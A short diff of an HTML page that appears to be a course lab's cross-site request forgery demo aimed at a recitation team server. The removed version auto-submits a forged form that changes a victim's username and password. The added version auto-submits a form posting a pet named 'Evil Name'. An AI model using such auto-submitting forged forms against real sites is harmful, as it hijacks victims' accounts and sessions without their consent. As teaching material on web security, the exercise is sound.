@@ -6,13 +6,12 @@
     <title>Document</title>
 </head>
 <body>
-    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/account" method="POST" id="form">
-        <input type="text" name="new_name" value="badName">
-        <input type="text" name="new_password" value="password123">
+    <form action="http://recitation-14-team-01.eastus.cloudapp.azure.com:3000/post_pets" method="POST" id="form">
+        <input type="text" name="name" value="Evil Name">
     </form>
     <script>
-        const changePass = document.querySelector("#form")
-        changePass.submit();
+        const postPet = document.querySelector("#form")
+        postPet.submit();
     </script>
 </body>
 </html>
